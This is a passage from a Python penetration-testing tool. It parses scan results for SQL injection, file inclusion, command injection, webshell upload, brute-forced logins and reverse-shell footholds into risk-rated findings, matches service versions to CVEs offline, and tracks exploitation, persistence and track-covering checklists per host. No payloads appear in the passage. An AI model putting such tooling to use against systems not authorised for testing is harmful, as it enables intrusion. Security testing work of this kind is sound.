            parts.append("self-signed cert")
        if parts:
            return {"state": "INFO", "cve": cve, "risk": "LOW" if selfsigned else "INFO",
                    "summary": " · ".join(parts)[:140]}
        return None

    # 2e) searchsploit: fold Exploit-DB candidate matches into one finding (leads, not proof)
    if sid == "searchsploit":
        titles = re.findall(r"^\[.*?\]\s*(.+?)\s*\(EDB-(\d+)\)", output, re.M)
        if not titles:
            return None
        items = [f"{t} (EDB-{e})" for t, e in titles]
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM",
                "summary": ("exploits: " + "; ".join(items))[:140]}

    # 2f) http-source: fold mined secrets / endpoints / comments counts into one finding
    if sid == "http-source":
        def _count(sec):
            mm = re.search(rf"{sec} \((\d+)\)", output)
            return int(mm.group(1)) if mm else 0
        nsec, neps, ncom = _count("POTENTIAL SECRETS"), _count("ENDPOINTS"), _count("HTML COMMENTS")
        if not (nsec or neps or ncom):
            return None
        parts = []
        if nsec:
            labels = sorted(set(re.findall(r"^  ([a-z-]+):",
                            output[output.find("POTENTIAL SECRETS"):], re.M)))
            parts.append("secrets: " + (", ".join(labels) if labels else str(nsec)))
        if neps:
            parts.append(f"endpoints: {neps}")
        if ncom:
            parts.append(f"comments: {ncom}")
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if nsec else "INFO",
                "summary": (" · ".join(parts))[:140]}

    # 2g) http-wellknown: fold robots/sitemap hidden paths + error-page tech leak into a finding
    if sid == "http-wellknown":
        def _c(sec):
            mm = re.search(rf"{sec} \((\d+)\)", output)
            return int(mm.group(1)) if mm else 0
        nrob, nsm, nwk = _c("ROBOTS PATHS"), _c("SITEMAP URLS"), _c("WELL-KNOWN")
        techm = re.search(r"^ERROR-PAGE TECH:\s*(.+)$", output, re.M)
        tech = techm.group(1).strip() if techm else ""
        if not (nrob or nsm or nwk or tech):
            return None
        parts = []
        if nrob:
            parts.append(f"robots: {nrob} paths")
        if nsm:
            parts.append(f"sitemap: {nsm} urls")
        if nwk:
            parts.append(f"well-known: {nwk}")
        if tech:
            parts.append("errorpage: " + tech)
        return {"state": "INFO", "cve": cve, "risk": "LOW" if (nrob or tech) else "INFO",
                "summary": (" · ".join(parts))[:140]}

    # 2h) http-cookies: JWT compromise (alg:none / weak secret) or missing cookie flags
    if sid == "http-cookies":
        jwt_hi = re.findall(r"⚠ (alg:none[^\n]*|weak HS256 secret: '[^']+')", output)
        gaps = re.findall(r"^  ([^:]+): missing ([A-Za-z,]+)", output, re.M)
        parts = []
        if jwt_hi:
            parts.append("JWT: " + "; ".join(jwt_hi))
        if gaps:
            parts.append("cookies: " + ", ".join(f"{n} missing {m}" for n, m in gaps[:4]))
        if not parts:
            return None
        sensitive = any(("Secure" in m or "HttpOnly" in m) for _n, m in gaps)
        risk = "HIGH" if jwt_hi else ("MEDIUM" if sensitive else "LOW")
        return {"state": "EXPOSED" if jwt_hi else "INFO", "cve": cve, "risk": risk,
                "summary": (" · ".join(parts))[:140]}

    # 2i) vhost-fuzz: virtual hosts discovered on this IP (each may hold its own app/vuln)
    if sid == "vhost-fuzz":
        vhosts = re.findall(r"^  \+ ([A-Za-z0-9_.-]+)", output, re.M)
        if not vhosts:
            return None
        shown = ", ".join(vhosts[:6]) + (f" +{len(vhosts) - 6} more" if len(vhosts) > 6 else "")
        return {"state": "INFO", "cve": cve, "risk": "LOW",
                "summary": f"vhosts: {shown} ({len(vhosts)})"[:140]}

    # 2j) dir-brute: discovered paths/files; elevate when something sensitive turns up
    if sid == "dir-brute":
        hits = re.findall(r"^\s*\+ (\d{3})\s+(\S+)", output, re.M)
        if not hits:
            return None
        shown = ", ".join(f"{p} ({s})" for s, p in hits[:6]) + \
            (f" +{len(hits) - 6} more" if len(hits) > 6 else "")
        sensitive = any(_DIRB_SENSITIVE.search(p) for _s, p in hits)
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if sensitive else "LOW",
                "summary": f"paths: {shown} ({len(hits)})"[:140]}

    # 2k) vcs-hunt: exposed VCS / backups / secrets — high when source/creds/data can leak
    if sid == "vcs-hunt":
        hits = re.findall(r"^\s*[!+] \d{3}\s+(\S+)", output, re.M)
        if not hits:
            return None
        shown = ", ".join(hits[:6]) + (f" +{len(hits) - 6} more" if len(hits) > 6 else "")
        high = any(_VCS_HIGH_RE.search(p) for p in hits)
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if high else "MEDIUM",
                "summary": f"exposed: {shown} ({len(hits)})"[:140]}

    # 2l) param-hunt: hidden GET params; MEDIUM when a param name implies injection surface
    if sid == "param-hunt":
        groups = re.findall(r"^\s+(\S+?)\?\[([^\]]+)\]", output, re.M)
        if not groups:
            return None
        params = {p.strip() for _e, ps in groups for p in ps.split(",") if p.strip()}
        shown = "; ".join(f"{e}?[{ps}]" for e, ps in groups[:4]) + (" …" if len(groups) > 4 else "")
        danger = params & _PARAM_DANGEROUS
        summ = f"params: {shown} ({len(params)})"
        if danger:
            summ += " · risky: " + ",".join(sorted(danger)[:6])
        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if danger else "LOW",
                "summary": summ[:140]}

    # 2m) default-creds: working default logins = immediate foothold → high
    if sid == "default-creds":
        hits = re.findall(r"^\s*! (\S+) @ (\S+) \((\w+)\)", output, re.M)
        if not hits:
            return None
        shown = "; ".join(f"{c} @ {p}" for c, p, _t in hits[:4]) + (" …" if len(hits) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"default creds: {shown} ({len(hits)})"[:140]}

    # 2n) auth-bypass: SQLi login bypass (highest) → DB error → user enumeration
    if sid == "auth-bypass":
        byp = re.findall(r"BYPASS (\S+)", output)
        err = re.findall(r"SQLERROR (\S+)", output)
        enum = re.findall(r"ENUM (\S+)", output)
        if byp:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SQLi auth bypass: {', '.join(byp[:3])} ({len(byp)})"[:140]}
        if err:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SQLi login (DB error): {', '.join(err[:3])} ({len(err)})"[:140]}
        if enum:
            return {"state": "INFO", "cve": cve, "risk": "MEDIUM",
                    "summary": f"user enumeration: {', '.join(enum[:3])} ({len(enum)})"[:140]}
        return None

    # 2o) login-brute: cracked creds (foothold) → high; lockout gate tripped → info
    if sid == "login-brute":
        cracked = re.findall(r"CRACKED (\S+) @ (\S+)", output)
        lock = re.findall(r"LOCKOUT (\S+)", output)
        if cracked:
            shown = "; ".join(f"{c} @ {p}" for c, p in cracked[:3]) + (" …" if len(cracked) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"brute-forced: {shown} ({len(cracked)})"[:140]}
        if lock:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"brute skipped — lockout: {', '.join(lock[:3])}"[:140]}
        return None

    # 2p) sqli-scan: injectable params (error/boolean/time) → sqlmap enum/dump
    if sid == "sqli-scan":
        pts = re.findall(r"✗ SQLI (\S+)", output)
        if not pts:
            return None
        dumped = "; dumped" if re.search(r"dumped: yes", output) else ""
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"SQLi: {shown} ({len(pts)}){dumped}"[:140]}

    # 2q) sqli-dump: OSCP-safe extraction — real data pulled = confirmed + looted
    if sid == "sqli-dump":
        pts = re.findall(r"✗ (\S+)", output)
        if not pts:
            return None
        db = re.search(r"db: (\S+)", output)
        looted = "; rows dumped" if re.search(r"^\s{8}\S", output, re.M) else ""
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        extra = (f"; db {db.group(1)}" if db else "") + looted
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"SQLi dump: {shown} ({len(pts)}){extra}"[:140]}

    # 2r) lfi-scan: local file read confirmed by content signature → high
    if sid == "lfi-scan":
        pts = re.findall(r"✗ LFI (\S+)", output)
        if not pts:
            return None
        caps = []
        if "/etc/passwd via" in output:
            caps.append("/etc/passwd")
        if "php://filter source readable" in output:
            caps.append("source")
        if "/proc/self/environ readable" in output:
            caps.append("environ")
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        tail = (" · " + "+".join(caps)) if caps else ""
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"LFI: {shown} ({len(pts)}){tail}"[:140]}

    # 2s) rfi-scan: wrapper inclusion with code execution (marker echoed) → RCE
    if sid == "rfi-scan":
        execs = re.findall(r"✗ RFI (\S+)", output)
        if not execs:
            return None
        shown = ", ".join(execs[:4]) + (f" +{len(execs) - 4}" if len(execs) > 4 else "")
        vtail = "; rev-shell verified" if "egress VERIFIED" in output else ""
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"RFI RCE (wrapper): {shown} ({len(execs)}){vtail}"[:140]}

    # 2t) cmdi-scan: OS command injection (computed-marker or time) → RCE
    if sid == "cmdi-scan":
        pts = re.findall(r"✗ CMDI (\S+)", output)
        if not pts:
            return None
        mu = re.search(r"^\s+id: (uid=\S+)", output, re.M)
        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
        tail = f" · {mu.group(1)}" if mu else ""
        if "egress VERIFIED" in output:
            tail += " · rev-shell verified"
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"OS cmd injection: {shown} ({len(pts)}){tail}"[:140]}

    # 2u) ssti-scan: template injection — RCE-confirmed (id) high, eval-only medium
    if sid == "ssti-scan":
        rce = re.findall(r"✗ SSTI (\S+)", output)
        eval_only = re.findall(r"⚠ SSTI (\S+)", output)
        if rce:
            eng = re.search(r"→ (\w+), RCE confirmed", output)
            uid = re.search(r"id: (uid=\S+)", output)
            shown = ", ".join(rce[:4]) + (f" +{len(rce) - 4}" if len(rce) > 4 else "")
            tail = (f"; {eng.group(1)}" if eng else "") + (f"; {uid.group(1)}" if uid else "")
            if "egress VERIFIED" in output:
                tail += "; rev-shell verified"
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"SSTI RCE: {shown} ({len(rce)}){tail}"[:140]}
        if eval_only:
            shown = ", ".join(eval_only[:4]) + (f" +{len(eval_only) - 4}" if len(eval_only) > 4 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "MEDIUM",
                    "summary": f"SSTI (eval, RCE unconfirmed): {shown} ({len(eval_only)})"[:140]}
        return None

    # 2v) upload-shell: file-upload webshell — code-executed critical, merely-stored high
    if sid == "upload-shell":
        rce = re.findall(r"✗ UPLOAD (\S+)", output)
        stored = re.findall(r"⚠ UPLOAD (\S+)", output)
        if rce:
            var = re.search(r"✗ UPLOAD \S+\s+\(([^)]+)\)", output)
            vt = f" ({var.group(1)})" if var else ""
            shown = rce[0] + (f" +{len(rce) - 1}" if len(rce) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"File-upload RCE: {shown}{vt}"[:140]}
        if stored:
            shown = stored[0] + (f" +{len(stored) - 1}" if len(stored) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Arbitrary file upload (exec unconfirmed): {shown}"[:140]}
        return None

    # 2w) xxe-ssrf: metadata/file-read critical, OOB-confirmed SSRF/XXE high
    if sid == "xxe-ssrf":
        meta = re.findall(r"✗ SSRF-META (\S+)", output)
        s_oob = re.findall(r"✗ SSRF-OOB (\S+)", output)
        x_read = re.findall(r"✗ XXE-READ (\S+)", output)
        x_oob = re.findall(r"✗ XXE-OOB (\S+)", output)
        if x_read:
            shown = x_read[0] + (f" +{len(x_read) - 1}" if len(x_read) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"XXE file read: {shown}"[:140]}
        if meta:
            shown = meta[0] + (f" +{len(meta) - 1}" if len(meta) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"SSRF → cloud metadata: {shown}"[:140]}
        if s_oob or x_oob:
            bits = ([f"SSRF ({len(s_oob)})"] if s_oob else []) + ([f"XXE ({len(x_oob)})"] if x_oob else [])
            first = (s_oob or x_oob)[0]
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Out-of-band {' + '.join(bits)}: {first}"[:140]}
        return None

    # 2x) idor-bac: IDOR / broken access control / authz bypass high, enumerable-only info
    if sid == "idor-bac":
        idor = re.findall(r"✗ IDOR (\S+)", output)
        bac = re.findall(r"✗ BAC (\S+)", output)
        authz = re.findall(r"✗ AUTHZ-BYPASS (\S+)", output)
        enum = re.findall(r"⚠ ENUM (\S+)", output)
        if idor:
            authed = " [authenticated]" if "[authenticated as" in output else ""
            shown = idor[0] + (f" +{len(idor) - 1}" if len(idor) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"IDOR: {shown}{authed}"[:140]}
        if bac:
            shown = bac[0] + (f" +{len(bac) - 1}" if len(bac) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Broken access control (unauth): {shown}"[:140]}
        if authz:
            shown = authz[0] + (f" +{len(authz) - 1}" if len(authz) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"401/403 authz bypass: {shown}"[:140]}
        if enum:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"Enumerable objects (verify for IDOR): {enum[0]}"[:140]}
        return None

    # 2y) cms-scan: vulnerable plugin/theme/core high, user enum info, detection info
    if sid == "cms-scan":
        vulns = re.findall(r"✗ CMS-VULN (.+)", output)
        users = re.search(r"⚠ CMS-USERS (.+)", output)
        cmsm = re.search(r"^CMS: (.+)$", output, re.M)
        if vulns:
            shown = vulns[0][:90] + (f" +{len(vulns) - 1}" if len(vulns) > 1 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"CMS vuln: {shown}"[:140]}
        if users:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"CMS user enumeration: {users.group(1)}"[:140]}
        if cmsm:
            return {"state": "INFO", "cve": cve, "risk": "INFO",
                    "summary": f"CMS detected: {cmsm.group(1)}"[:140]}
        return None

    # 2z) admin-rce: authenticated admin panel → code execution
    if sid == "admin-rce":
        hits = re.findall(r"✗ ADMIN-RCE (\S+)", output)
        if hits:
            meth = re.search(r"✗ ADMIN-RCE \S+\s+\(([^)]+)\)", output)
            mt = f" ({meth.group(1)})" if meth else ""
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"Authenticated admin RCE: {hits[0]}{mt}"[:140]}
        return None

    # 2aa) foothold: a reverse shell was fired over a confirmed RCE channel
    if sid == "foothold":
        m = re.search(r"foothold: fired (.+)$", output)
        if m:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"Reverse shell foothold: {m.group(1)}"[:140]}
        return None

    # 3) info rules over -sC output
    low = output.lower()
    info = None
    if sid == "http-git":
        info = ("exposed .git repository", "MEDIUM")
    elif sid == "http-config-backup":
        info = ("exposed config/backup file", "MEDIUM")
    elif sid == "http-methods" and re.search(r"\b(PUT|DELETE|TRACE|CONNECT)\b", output):
        info = ("risky HTTP methods enabled", "LOW")
    elif sid in ("http-title", "http-ls") and "index of /" in low:
        info = ("directory listing enabled", "LOW")
    elif sid == "ssl-enum-ciphers" and re.search(r"least strength:\s*[C-F]", output):
        info = ("weak TLS ciphers", "MEDIUM")
    elif sid in ("smb-security-mode", "smb2-security-mode") and "not required" in low:
        info = ("SMB message signing not required", "MEDIUM")
    elif sid == "ssh-auth-methods" and "password" in low:
        info = ("SSH password authentication enabled", "INFO")
    if info:
        return {"state": "INFO", "cve": cve, "risk": info[1], "summary": info[0]}
    return None


def _run_vuln_pass(job: dict, scripts: str, ports: list, ip: str, deadline: float) -> None:
    """Run one family's targeted vuln/auth scan, streaming script output (to scripts)
    and parsed findings (to vulns) to the DB. Honours job['cancel']."""
    args = ["-sV", "--script", scripts, "-Pn", "-n", "-T3",
            "--script-timeout", "120s", "-p", ",".join(str(p) for p in ports)]

    def _on_items(batch):
        for h in batch:
            if _is_self_ip(h["ip"]):
                continue
            if h.get("scripts"):
                save_scripts(h["ip"], h["scripts"])     # also extracts findings -> vulns
            if h.get("services"):
                save_services(h["ip"], h["services"])
            job["hosts"] = len(fetch_vulns(h["ip"]))     # count of findings so far
            _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_detail_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_vuln_scan(ip: str, minutes: int) -> None:
    """One concurrent targeted scan per service family, sharing one time budget."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])
    deadline = max(1, minutes * 60)
    name = _PHASES["3"][0]
    families = _vuln_families(ip)
    if not families:
        job = _new_job("3", name, f"nmap (no known services on {ip})")
        job["state"] = "done"
        _job_update(job)
        return
    run = _next_run_id()
    threads = []
    for label, scripts, ports in families:
        command = f"nmap -sV --script {scripts} -T3 -p {','.join(str(p) for p in ports)} {ip}"
        job = _new_job("3", f"{name} · {label}", command, run)
        t = threading.Thread(target=_run_vuln_pass, args=(job, scripts, ports, ip, deadline),
                             daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_vuln_scan(ip: str, minutes: int) -> None:
    """Launch the vuln scan in the background; the menu stays free."""
    threading.Thread(target=_run_vuln_scan, args=(ip, minutes), daemon=True).start()


# ── CVE lookup (phase 5) ──────────────────────────────────────────────────────
# Offline enrichment: the service-detection phase stores a CPE per port; here we
# match that CPE (vendor/product + version) against the local NVD-derived index
# (appdata/cve_index.db) and record the known CVE numbers as findings. No network,
# no scanning — pure lookup. Only versioned CPEs are used (a general CPE without a
# version can't be mapped precisely and would produce false positives).
_CVE_STORE_CAP = 20        # newest CVEs kept per service (keeps findings readable)

# The same product often carries a different CPE vendor/product in nmap output than
# the one(s) NVD files its CVEs under. Map the nmap pair to the canonical NVD pair(s)
# that actually hold the CVEs; the lookup queries the original AND every alias and
# unions the results, so nothing is silently missed (some products span two vendors,
# e.g. rabbitmq under pivotal_software and broadcom).
_CPE_ALIAS = {
    ("mysql", "mysql"):                 [("oracle", "mysql")],
    ("nginx", "nginx"):                 [("f5", "nginx")],
    ("igor_sysoev", "nginx"):           [("f5", "nginx")],
    ("elasticsearch", "elasticsearch"): [("elastic", "elasticsearch")],
    ("squid", "squid"):                 [("squid-cache", "squid")],
    ("isc", "bind9"):                   [("isc", "bind")],
    ("vsftpd", "vsftpd"):               [("redhat", "vsftpd")],
    ("proftpd", "proftpd"):             [("proftpd_project", "proftpd")],
    ("rabbitmq", "rabbitmq"):           [("pivotal_software", "rabbitmq"),
                                         ("broadcom", "rabbitmq_server")],
    ("pureftpd", "pureftpd"):           [("pureftpd", "pure-ftpd")],
}


def _ver_key(v: "str | None") -> tuple:
    """Version as a tuple of its numeric components, e.g. '8.2p1' → (8, 2, 1).
    Good enough to order/compare the version strings NVD uses in its ranges."""
    return tuple(int(x) for x in re.findall(r"\d+", v or ""))


def _ver_cmp(a: "str | None", b: "str | None") -> int:
    """-1 / 0 / 1 comparing two version strings by their numeric components."""
    ta, tb = _ver_key(a), _ver_key(b)
    n = max(len(ta), len(tb))
    ta += (0,) * (n - len(ta))
    tb += (0,) * (n - len(tb))
    return (ta > tb) - (ta < tb)


def _cve_sort_key(cve: str) -> tuple:
    """Sort CVE ids newest-first (by year, then sequence)."""
    m = re.match(r"CVE-(\d+)-(\d+)", cve)
    return (-int(m.group(1)), -int(m.group(2))) if m else (0, 0)


def _cpe_parts(cpe: "str | None") -> "tuple | None":
    """(vendor, product, version) from a CPE 2.2 (cpe:/a:v:p:ver) or 2.3
    (cpe:2.3:a:v:p:ver:…) URI. version is None when absent/any ('*'/'-')."""
    if not cpe or not cpe.startswith("cpe:"):
        return None
    body = cpe[4:]
    if body.startswith("/"):                       # 2.2
        f = body[1:].split(":")
    elif body.startswith("2.3:"):                  # 2.3
        f = body[4:].split(":")
    else:
        return None
    if len(f) < 3:
        return None
    vendor, product = f[1], f[2]
    version = f[3] if len(f) > 3 else None
    version = None if version in ("", "*", "-") else version
    if not vendor or not product:
        return None
    return vendor, product, version


def _ver_in_match(version: str, exact, vsi, vse, vei, vee) -> bool:
    """True when ``version`` satisfies one NVD cpeMatch row — deliberately strict, to
    show fewer but better-verified CVEs (less noise) rather than everything NVD lists:

      • exact version: matched only when the fingerprint is at least as precise as the
        exact value (so a bare major like '4' is NOT taken as '4.0.0' and does not match
        every '4.x' exact row — the biggest false-positive source).
      • ranges: only *closed* ranges (a start bound AND an end bound) count, and only for
        a fingerprint with ≥2 numeric components. Open-ended rows ('< X' / '>= X' only,
        or 'all versions') are dropped — they match huge, cross-branch swaths of versions.
    """
    vk = _ver_key(version)
    if exact:
        ek = _ver_key(exact)
        if len(vk) < len(ek):
            return False                   # fingerprint too coarse to claim this version
        n = max(len(vk), len(ek))
        return vk + (0,) * (n - len(vk)) == ek + (0,) * (n - len(ek))
    if len(vk) < 2:
        return False                       # bare major — too coarse to place in a range
    if not ((vsi or vse) and (vei or vee)):
        return False                       # open-ended / unbounded range — dropped
    if vsi and _ver_cmp(version, vsi) < 0:
        return False
    if vse and _ver_cmp(version, vse) <= 0:
        return False
    if vei and _ver_cmp(version, vei) > 0:
        return False
    if vee and _ver_cmp(version, vee) >= 0:
        return False
    return True


def _cve_lookup(vendor: str, product: str, version: str) -> "list | None":
    """Matching CVE ids (newest first) for one vendor/product/version, or None when
    the index is missing/unreadable. Queries the CPE pair plus any aliases (some
    products file CVEs under several NVD vendors) and unions the results."""
    if not os.path.exists(CVE_INDEX_PATH):
        return None
    targets = [(vendor, product)] + _CPE_ALIAS.get((vendor, product), [])
    try:
        con = sqlite3.connect(CVE_INDEX_PATH)
        try:
            rows = []
            for v, p in targets:
                rows += con.execute(
                    "SELECT m.exact_ver, m.vsi, m.vse, m.vei, m.vee, m.cve "
                    "FROM cve_match m JOIN product p ON p.id = m.product_id "
                    "WHERE p.vendor = ? AND p.product = ?", (v, p)).fetchall()
        finally:
            con.close()
    except sqlite3.Error:
        return None
    matched = {cve for exact, vsi, vse, vei, vee, cve in rows
               if _ver_in_match(version, exact, vsi, vse, vei, vee)}
    return sorted(matched, key=_cve_sort_key)


def _run_cve_lookup(ip: str) -> list:
    """Per versioned service CPE on the host, the CVEs it maps to.
    Returns [(port, proto, product, version, [cve, …]), …]."""
    results = []
    for (port, proto), (_name, product_s, version_s, cpe) in sorted(fetch_services(ip).items()):
        parts = _cpe_parts(cpe)
        if not parts:
            continue
        vendor, product, cpe_ver = parts
        version = cpe_ver or version_s
        if not version or not re.search(r"\d", version):
            continue                               # need a concrete version
        cves = _cve_lookup(vendor, product, version)
        if cves:
            results.append((port, proto, product, version, cves))
    return results


def save_cve_findings(ip: str, results: list) -> None:
    """Replace this host's CVE-lookup findings in the vulns table (script
    'cve-lookup', one row per port), so re-running the phase stays idempotent."""
    if not ip or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute("DELETE FROM vulns WHERE ip = ? AND script = 'cve-lookup'", (ip,))
            for port, proto, product, version, cves in results:
                cve_str = ",".join(cves[:_CVE_STORE_CAP])
                summary = f"{product} {version} — {len(cves)} known CVE(s)"
                conn.execute(
                    "INSERT INTO vulns (ip, port, proto, script, state, cve, risk, summary, "
                    "first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (ip, port, proto, "cve-lookup", "CVE", cve_str, "INFO", summary, now, now))
            conn.commit()
        finally:
            conn.close()


def _do_cve_lookup(ip: str) -> None:
    """Run the offline lookup for one host, store findings, log a job, print a recap."""
    name = _PHASES["4"][0]
    job = _new_job("4", f"{name} · {ip}", f"cve-index lookup (offline NVD) for {ip}")
    results = []
    try:
        results = _run_cve_lookup(ip)
        save_cve_findings(ip, results)
        lines = [f"CVE lookup — {ip} (offline NVD index)"]
        for port, proto, product, version, cves in results:
            lines.append(f"{port}/{proto}  {product} {version}  {len(cves)} CVE")
            shown = cves[:_CVE_STORE_CAP]
            lines.append("  " + ", ".join(shown)
                         + (f"  (+{len(cves) - len(shown)} more)" if len(cves) > len(shown) else ""))
        job["output"], job["hosts"], job["state"] = "\n".join(lines), len(results), "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)

    if not results:
        print(f"\n{DIM}▸ CVE lookup — {ip}: no versioned service CPE matched the index "
              f"(run {BOLD}[2] Service detection{RESET}{DIM} first, or no known CVEs){RESET}")
        return
    total = sum(len(cves) for *_rest, cves in results)
    print(f"\n{GREEN}▶ CVE lookup done{RESET} {DIM}({ip} · {len(results)} service(s), {total} CVE) — "
          f"see {BOLD}[f] findings{RESET}{DIM} · {BOLD}[s] status{RESET}")


def _handle_cve_lookup() -> None:
    """Phase 5 flow: read a target IP and match its service CPEs to known CVEs."""
    if not os.path.exists(CVE_INDEX_PATH):
        print(f"\n{YELLOW}⚠ CVE index not found{RESET} {DIM}({os.path.basename(CVE_INDEX_PATH)}) "
              f"— build it with the installer's NVD step, then retry{RESET}")
        return
    while True:
        value = _ctx_ask("cve", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_services(ip):
            print(f"{DIM}note: no services recorded for {ip} — run {BOLD}[2] Service "
                  f"detection{RESET}{DIM} first{RESET}")
            continue
        _do_cve_lookup(ip)
        return


# ── progress (per-host workflow tracker) ──────────────────────────────────────
def _host_job_states(ip: str) -> dict:
    """Aggregated command-history state per phase for one host. A phase spawns several
    commands (parallel nmap passes / script families), so its state is combined across
    all of them: 'running' while ANY is still running, and only settling to
    'done'/'error'/'aborted' once they have all finished — so progress never flips to
    complete mid-scan. A job belongs to the host when the IP appears as a whole token in
    its command or name."""
    pat = re.compile(r"(?<!\d)" + re.escape(ip) + r"(?!\d)")
    with _JOBS_LOCK:
        jobs = list(_JOBS)
    per_phase: dict = {}
    for j in jobs:
        if pat.search(j.get("command") or "") or pat.search(j.get("name") or ""):
            per_phase.setdefault(j["phase"], []).append(j["state"])
    return {phase: _agg_state(sts) for phase, sts in per_phase.items()}


def _agg_state(states: list) -> str:
    """Combine several command states into one: 'running' while any is still going;
    else a success ('done') settles it; 'error'/'aborted' only when nothing completed."""
    if "running" in states:
        return "running"
    if "done" in states:
        return "done"
    if "error" in states:
        return "error"
    if "aborted" in states:
        return "aborted"
    return states[-1] if states else "done"


def _render_host_progress(ip: str) -> None:
    """Per-host workflow tracker: for every phase, show whether it has run for this host
    (evidence in the DB) and its current state from the command history — so it's clear
    what's complete, what's mid-run and what hasn't been done yet."""
    known = any(r[0] == ip for r in fetch_hosts())
    ports = fetch_ports(ip)
    services = fetch_services(ip)
    host_scripts = fetch_scripts(ip, 0, "")
    scripted = fetch_scripted_ports(ip)
    vulns = fetch_vulns(ip)
    # Phase 3's -sC feeds the same vulns table (http-methods, ssl-cert… all state INFO),
    # so findings alone don't prove the vuln scan ran. Count only what the vuln category
    # emits and -sC does not — VULNERABLE/LIKELY; a phase-4 job (persisted) also marks it.
    vuln_findings = [v for v in vulns if v[3] in ("VULNERABLE", "LIKELY")]   # phase 4
    cve_findings = [v for v in vulns if v[3] == "CVE"]       # phase 5
    n_cve = sum(len([c for c in (v[4] or "").split(",") if c.strip()]) for v in cve_findings)
    jobstate = _host_job_states(ip)

    # Phase 2 (port scan) already seeds the services table with nmap's port->name
    # guesses, so a bare name doesn't prove phase 3 ran. Service detection (-sV -sC) is
    # what adds a product/version/CPE or NSE script output — that's the real evidence.
    fingerprinted = [s for s in services.values() if s[1] or s[2] or s[3]]

    # Phase 2 also re-registers the host (save_hosts), so "on record" alone doesn't mean
    # host discovery ran. Prefer the discovery job's own record: if a discovery pass ran
    # this session (its found-set is populated), phase 1 counts only when it found THIS
    # host. With no live discovery job (e.g. a prior session), fall back to "on record".
    with _JOBS_LOCK:
        disc = [j for j in _JOBS if j["phase"] == "0"]
        discovered = any(ip in j["found"] for j in disc)
        live_discovery = any(j["found"] for j in disc)
    phase0_done = discovered or (known and not live_discovery)

    # phase 5 (service exploitation) is complete only when EVERY service's checklist is
    # resolved (done/skip); phase 6 (privesc) when its OS checklist is resolved.
    targets = _exploit_targets(ip)
    n_svc_done = sum(1 for p, pr, _l, k, _v, _s in targets if _service_steps_complete(ip, p, pr, k))
    phase5_done = bool(targets) and n_svc_done == len(targets)
    privesc_done, privesc_detail = _os_checklist_progress(ip, "privesc", _PRIVESC_STEPS)
    persist_done, persist_detail = _os_checklist_progress(ip, "persist", _PERSIST_STEPS)
    cover_done, cover_detail = _os_checklist_progress(ip, "cover", _COVER_STEPS)

    # phase key -> (has evidence in the DB, short detail line)
    evidence = {
        "0": (phase0_done, "on record" if phase0_done else ""),
        "1": (bool(ports), f"{len(ports)} open port(s)" if ports else ""),
        "2": (bool(fingerprinted) or bool(host_scripts) or bool(scripted),
